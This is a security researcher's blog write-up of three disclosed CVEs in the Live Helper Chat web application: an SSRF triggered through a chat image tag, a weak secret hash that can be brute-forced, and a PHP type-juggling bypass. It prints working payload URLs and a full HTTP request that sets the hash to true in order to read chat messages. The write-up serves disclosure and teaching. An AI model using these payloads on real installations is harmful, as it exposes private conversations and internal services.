#Live Helper Chat CVEs
1649737152

Did a secure code review on Live Helper Chat as part of a pentest, found some CVEs, and learned some tricks that I think are cool to have in mind while doing bug bounty.

## Authenticated SSRF - [CVE-2022-1191](https://huntr.dev/bounties/7264a2e1-17e7-4244-93e4-49ec14f282b3/)

An easy SSRF on `http://127.0.0.1/index.php/cobrowse/proxycss/1?base=gopher://0:80/xGET%20/&css=` , with some host bypassing. Nothing much here, but you need to be authenticated, altho there's no CSRF protection the cookie has `SameSite=Lax` :c

Just send the SSRF link on the chat as an image (;

`[img]https://demo.livehelperchat.com/index.php/cobrowse/proxycss/1?base=gopher://0:80/xGET%20/&css=[/img]`

When the Admin sees the "image" the SSRF will trigger, a nice little chain to prove impact.

## Weak secret - [CVE-2022-1235](https://huntr.dev/bounties/92f7b2d4-fa88-4c62-a2ee-721eebe01705/)

The application used secretHash as a secret on lots of functionalities, but it was defined as :

```php
<?
$cfgSite->setSetting( 'site', 'secrethash', substr(md5(time() . ":" . mt_rand()),0,10));
```

10 characters of only hexadecimal, making 16^10 possilibities ( 1.099.511.627.776 ), totally brute-forceable. Also, don't use mt_rand, it's pretty broken. You can get an sha1 of it on the captcha :

```php
<?
$hash = sha1(erLhcoreClassIPDetect::getIP() . $Params['user_parameters']['timets'] . erConfigClassLhConfig::getInstance()->getSetting( 'site', 'secrethash' ));
```

You know every argument but the hash, pass it to hashcat and profit.

For bug bounty, trying to guess how hashes are generated is a valid strategy, better if you can reverse engineer it on a mobile app or some javascript, found a couple of bugs that way.

## Type Juggling 2 IDOR - [CVE-2022-1176](https://huntr.dev/bounties/3e30171b-c9bf-415c-82f1-6f55a44d09d3/)

The app used loose comparison on a security feature, if you have the hash you can read the content

```php
<?
    if ($chat instanceof erLhcoreClassModelChat && $chat->hash == $requestPayload['hash'])
```

But it accepts JSON as input, oh no (ﾉಥ益ಥ)ﾉ

```php
<?
$requestPayload = json_decode(file_get_contents('php://input'),true);
```

just replace it to true and bypass the check (づ｡◕‿‿◕｡)づ

```
POST /eng/widgetrestapi/fetchmessages HTTP/1.1
Host: demo.livehelperchat.com
Cookie: lhc_vid=eb9bc0c044919538c5b1
Content-Length: 62
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Origin: https://demo.livehelperchat.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.livehelperchat.com/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{
   "chat_id":2,
   "hash":true,
   "lmgsid":1,
   "theme":1,
   "new_chat":true
}
```

Every time I see a JSON now I'll put a true somewhere.

## Closing thoughts

Always chain authenticated vulnerabilities, not ignore hashes, and put true ( or Array ) every-fucking-where.

Also, shoutout to [huntr.dev](https://huntr.dev), made it really easy to send the vulnerabilities and talk directly to the dev, they also managed the whole CVE process, having a bounty on projects on github is really nice (altho small at the moment, >0 is nice anyway) I don't have any clue how they make money :p